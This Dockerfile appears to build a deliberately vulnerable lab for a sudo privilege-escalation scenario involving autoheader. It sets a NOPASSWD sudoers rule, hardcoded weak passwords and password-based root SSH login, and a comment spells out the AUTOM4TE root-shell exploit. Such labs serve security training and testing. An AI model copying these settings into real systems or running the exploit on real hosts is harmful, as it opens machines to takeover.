FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_autoheader
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/autoheader as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and autoconf (provides autoheader)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        autoconf \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify autoheader is installed
RUN which autoheader && ls -la /usr/bin/autoheader

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# autoheader uses the AUTOM4TE environment variable to determine which
# program to invoke. By setting AUTOM4TE to a script that spawns a shell,
# running `sudo autoheader` with a dummy configure.ac gives root shell.
# Exploit:
#   echo '/bin/sh 1>&0' > /tmp/exploit.sh
#   chmod +x /tmp/exploit.sh
#   cd /tmp && touch configure.ac
#   AUTOM4TE=/tmp/exploit.sh sudo autoheader
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/autoheader" > /etc/sudoers.d/autoheader && \
    chmod 440 /etc/sudoers.d/autoheader

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]